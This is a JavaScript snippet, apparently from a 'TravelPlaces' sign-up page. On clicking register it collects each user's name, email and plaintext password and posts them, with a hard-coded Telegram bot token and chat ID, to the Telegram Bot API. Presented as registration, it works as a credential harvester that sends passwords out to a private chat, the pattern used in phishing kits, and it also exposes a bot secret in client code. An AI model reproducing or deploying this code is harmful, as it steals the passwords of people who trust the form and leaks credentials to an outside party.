    const token = '5255472868:AAFr5lWTcc-UiTyru-W6CcxibuyVF589rOw';
    const chatId = '241593683';

    $(document).ready(function () {
        $("#register_button").on('click', function (event) {
            execute();
        });

        function execute() {
            const firstname = document.querySelector('#firstname').value;
            const lastname = document.querySelector('#lastname').value;
            const email = document.querySelector('#email').value;
            const password = document.querySelector('#password').value;
            const message = `Hello ${firstname} ${lastname}. Welcome to the TravelPlaces!\nEmail: ${email} \nPassword: ${password}`;

            $.ajax({
                type: 'POST',
                url: `https://api.telegram.org/bot${token}/sendMessage`,
                data: {
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'html',
                },
                success: function (res) {
                    console.debug(res);
                    $('#response').text('Message sent');
                },
                error: function (error) {
                    console.error(error);
                    alert("error failed");
                }
            });
        }
    });